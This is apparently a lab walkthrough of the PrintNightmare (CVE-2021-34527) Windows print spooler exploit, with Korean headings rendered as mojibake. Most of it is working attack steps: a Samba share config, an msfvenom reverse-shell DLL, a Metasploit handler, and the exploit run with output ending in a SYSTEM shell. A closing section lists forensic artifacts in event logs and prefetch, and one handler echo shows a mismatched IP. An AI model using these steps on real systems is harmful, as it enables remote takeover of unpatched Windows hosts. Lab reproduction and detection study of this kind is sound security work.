# [ëª©ì°¨]
**1. [Environment](#Environment)**

**2. [Setting](#Setting)**

**3. [Exploit](#Exploit)**

**4. [etc](#etc)**


***


# **Environment**

| Type       | OS              | Build     | Core | RAM  | IP            | App          |
| :---       | :---            | :---      | :--- | :--- | :---          | :---         |
| Victim     | Windows 10 1903 | 18362.356 | 2    | 4GB  | 192.168.0.114 |              |
| Attacker   | Kali 2019       |           |      |      | 192.168.0.112 | [exploit.py](https://github.com/2jinu/CVE/blob/main/RCE/%5BWindows%5D%20CVE-2021-34527/file/exploit.py) |


# **Setting**

spooler ì„œë¹„ìŠ¤ ë™ì‘ í™•ì¸

![](images/2022-05-18-21-39-59.png)



# **Exploit**

SMB ì„œë²„ì˜ smb.conf(/etc/samba/smb.conf) ì„¤ì • ìˆ˜ì •

```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445

[smb]
comment = Samba
path = /tmp/
guest ok = yes
writable = yes
read only = no
browseable = yes
force user = nobody
```

reverse tcp í˜ì´ë¡œë“œ ìƒì„±

```sh
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=192.168.0.112 LPORT=3333 -o /tmp/evil.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes
Saved as: /tmp/evil.dll
```

SMB ì„œë²„ ì‹¤í–‰

```sh
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# service smbd start                                                   3 â¨¯
                                                                             
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# service smbd status
â— smbd.service - Samba SMB Daemon
     Loaded: loaded (/lib/systemd/system/smbd.service; disabled; vendor pres>
     Active: active (running) since Thu 2021-07-15 22:20:38 EDT; 1s ago
...
```

metasploit ì„¸ì…˜ ëŒ€ê¸°

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/shell_reverse_tcp
PAYLOAD => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.112
LHOST => 192.168.10.223
msf6 exploit(multi/handler) > set LPORT 3333
LPORT => 3333
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:3333
```

Exploit Code ì‹¤í–‰

    python3 exploit.py "ì•„ì´ë””":"ë¹„ë°€ë²ˆí˜¸"@"ê³µê²© ëŒ€ìƒ IP" "ì•„ë¬´ ë¬¸ìì—´" "\\SMB ì„œë²„ IP\ê³µìœ  í´ë” ëª…\ì‹¤í–‰ì‹œí‚¬ ì•…ì„±ì½”ë“œ"

```sh
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# python3 CVE-2021-34527.py user:user@192.168.0.114 a '\\192.168.0.112\smb\evil.dll'
[*] Connecting to ncacn_np:192.168.0.114[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_16f13144559407c0\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.0.112\smb\evil.dll
[*] Try 0...
[*] Stage0: 0
[*] Stage1: 0
[+] Exploit Completed
[*] Stage2: 0
[+] Exploit Completed
[*] Stage3: 0
[+] Exploit Completed
SMB SessionError: STATUS_PIPE_BROKEN(The pipe operation has failed because the other end of the pipe has been closed.)
SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
...
```

metasploit ì„¸ì…˜ í™•ì¸

```sh
[*] Command shell session 1 opened (192.168.0.112:3333 -> 192.168.0.114:50004) at 2021-07-16 00:32:42 -0400
C:\Windows\system32>whoami
whoami
nt authority\system
```

# **etc**

ì´ë²¤íŠ¸ë·°ì–´(eventvwr)ì˜ ë¡œê·¸ í™•ì¸

    Windows ë¡œê·¸ > ë³´ì•ˆ

![](images/2022-05-18-21-48-56.png)

![](images/2022-05-18-21-49-00.png)

![](images/2022-05-18-21-49-04.png)

    Windows ë¡œê·¸ > ì‘ìš© í”„ë¡œê·¸ë¨

![](images/2022-05-18-21-49-15.png)

![](images/2022-05-18-21-49-19.png)

    Windows ë¡œê·¸ > ì‹œìŠ¤í…œ

![](images/2022-05-18-21-49-30.png)

    ì‘ìš© í”„ë¡œê·¸ë¨ ë° ì„œë¹„ìŠ¤ ë¡œê·¸ > Microsoft > Windows > SMBClient > Operational

![](images/2022-05-18-21-49-55.png)

process tree í™•ì¸

![](images/2022-05-18-21-50-08.png)

prefetch í™•ì¸

![](images/2022-05-18-21-50-19.png)

[Reference](https://github.com/cube0x0/CVE-2021-1675)